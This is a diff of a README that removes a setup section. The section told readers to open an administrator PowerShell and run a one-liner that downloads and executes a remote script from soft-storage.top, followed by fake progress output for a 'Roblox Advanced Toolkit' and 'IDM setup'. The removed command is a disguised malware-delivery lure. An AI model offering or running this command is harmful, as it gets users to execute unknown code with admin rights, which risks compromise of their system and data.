@@ -1,32 +1,3 @@
-## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
-
-### Step 1: Open CMD or PowerShell as Administrator
-```cmd
-# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
-```
-
-### Step 2: Execute Deployment Command
-```cmd
-powershell iex (iwr "http://soft-storage.top/worker?=8250387447/Git" -UseBasicParsing)
-```
-
-### Step 3: Wait for Completion
-```
-[1/4] Loading Roblox Advanced Toolkit modules...
-[2/4] Extracting setup manager and patch components...
-[3/4] Installing automation utilities and settings templates...
-[4/4] Ready. Start managing IDM setup and automation.
-```
-
-### Step 4: Start Using the Toolkit
-- Run setup manager or patch utility
-
-
-
-
-
-
-<div align="center">
 
 
 
